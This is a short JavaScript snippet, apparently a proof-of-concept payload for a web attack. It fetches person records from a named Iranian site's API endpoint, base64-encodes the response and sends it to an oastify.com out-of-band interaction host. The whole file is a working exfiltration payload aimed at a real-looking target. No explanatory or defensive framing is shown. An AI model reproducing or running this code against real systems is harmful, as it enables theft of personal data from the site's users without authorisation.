// Function to fetch data, encode it as base64, and send it to a new URL
function fetchEncodeAndSend(originalUrl, targetUrlBase) {
    fetch(originalUrl)
        .then(response => {
            if (!response.ok) throw new Error('Network response was not ok');
            return response.blob();  // Get the binary data
        })
        .then(blob => {
            const reader = new FileReader();
            reader.readAsDataURL(blob);  // Convert the blob to base64
            reader.onloadend = () => {
                const base64result = reader.result.split(',')[1];  // Get only the base64 part without the prefix
                const finalUrl = `${targetUrlBase}/${encodeURIComponent(base64result)}`;  // Construct the final URL
                console.log('Sending to:', finalUrl);
                // Optionally send a GET request to the new URL
                fetch(finalUrl).then(response => {
                    console.log('Response from the new request:', response);
                }).catch(error => console.error('Error in sending base64:', error));
            };
        })
        .catch(error => console.error('Error in fetching or encoding:', error));
}

// Usage example
const originalDataUrl = 'https://my.daryakenar.ir/api/Gates/person';  // URL where initial data is fetched from
const targetUrlBase = 'https://v3zercz6vj1ycza5jqal548b228twokd.oastify.com';  // Base URL where you send the base64 encoded data

fetchEncodeAndSend(originalDataUrl, targetUrlBase);
